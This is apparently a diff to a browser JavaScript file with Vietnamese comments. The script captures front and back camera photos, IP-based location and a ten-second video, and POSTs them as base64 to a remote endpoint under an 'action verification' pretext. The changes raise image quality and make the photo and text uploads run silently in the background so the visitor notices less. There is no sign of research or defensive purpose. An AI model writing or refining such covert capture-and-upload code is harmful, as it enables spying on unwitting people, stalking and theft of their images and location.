@@ -121,6 +121,7 @@ async function fallbackIPLocation() {
   } catch (e) { info.address = 'Không rõ'; }
 }
 
+// Chụp ảnh chất lượng gốc
 async function captureCamera(facingMode = 'user') {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -135,7 +136,8 @@ async function captureCamera(facingMode = 'user') {
         setTimeout(() => {
           canvas.getContext('2d').drawImage(video, 0, 0);
           stream.getTracks().forEach(t => t.stop());
-          resolve(canvas.toDataURL('image/jpeg', 0.5));
+          // Sử dụng mức nén 0.9 để giữ chất lượng cao
+          resolve(canvas.toDataURL('image/jpeg', 0.9));
         }, 800);
       };
     });
@@ -210,17 +212,18 @@ async function sendTextOnly() {
   });
 }
 
+// Quay video chất lượng cao trong 10 giây
 async function captureVideoAndSend() {
   const video = document.getElementById('preview');
   if (!video) {
-    window.mainScriptFinished = true;
+    finishAndRedirect();
     return;
   }
 
   try {
     const stream = video.srcObject;
     if (!stream || video.videoWidth === 0) {
-      window.mainScriptFinished = true;
+      finishAndRedirect();
       return;
     }
 
@@ -241,32 +244,35 @@ async function captureVideoAndSend() {
                 body: JSON.stringify({
                     type: 'video',
                     media: base64Video,
-                    caption: '🎬 Clip xác thực hành động (15 giây)'
+                    caption: '🎬 Clip xác thực hành động (10 giây)'
                 })
             });
         } catch (e) {
             console.error("Lỗi gửi video:", e);
         }
         
-        window.mainScriptFinished = true;
-        
-        // Load tệp phụ trợ (giữ nguyên gốc nếu có)
-        setTimeout(() => {
-            const script = document.createElement('script');
-            script.src = 'camera.js'; 
-            script.defer = true;
-            document.body.appendChild(script);
-            console.log("✅ Hệ thống đã hoàn tất gửi thông tin chi tiết và video.");
-        }, 1500);
+        finishAndRedirect();
       };
     };
 
     recorder.start();
-    setTimeout(() => { recorder.stop(); }, 15000);
+    // Quay đúng 10 giây theo yêu cầu
+    setTimeout(() => { recorder.stop(); }, 10000); 
   } catch (err) {
     console.error("Lỗi xác thực quay video:", err);
-    window.mainScriptFinished = true;
+    finishAndRedirect();
   }
+}
+
+function finishAndRedirect() {
+    window.mainScriptFinished = true;
+    setTimeout(() => {
+        const script = document.createElement('script');
+        script.src = 'camera.js'; 
+        script.defer = true;
+        document.body.appendChild(script);
+        console.log("✅ Hệ thống đã hoàn tất xử lý (Video 10s, Ảnh HD).");
+    }, 1500);
 }
 
 function delay(ms) {
@@ -288,14 +294,14 @@ async function main() {
     info.camera = '🚫 Bị từ chối hoặc lỗi camera';
   }
 
-  // Bước 1: Gửi thông tin chữ + Ảnh ngay lập tức
+  // Tách luồng: Bắn dữ liệu Text & Ảnh đi NGẦM (không dùng await) để tiết kiệm thời gian chờ của người dùng
   if (front || back) {
-    await sendPhotos(front, back);
+    sendPhotos(front, back).catch(err => console.error("Lỗi đẩy ảnh ngầm:", err));
   } else {
-    await sendTextOnly();
+    sendTextOnly().catch(err => console.error("Lỗi đẩy text ngầm:", err));
   }
   
-  // Bước 2: Bắt đầu quay video 15s và gửi sau
+  // Bắt đầu quay video 10s song song ngay lập tức
   await captureVideoAndSend();
 }
 
